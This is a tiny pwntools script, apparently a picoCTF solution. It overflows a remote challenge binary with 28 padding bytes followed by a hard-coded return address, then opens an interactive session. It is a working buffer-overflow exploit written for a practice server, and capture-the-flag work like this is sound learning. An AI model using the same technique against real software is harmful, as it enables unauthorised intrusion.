from pwn import *

#p = process('./vuln')
p = remote('saturn.picoctf.net', '63837')
p.sendline(b'a'*28 + p32(0x5655630d))

p.interactive()
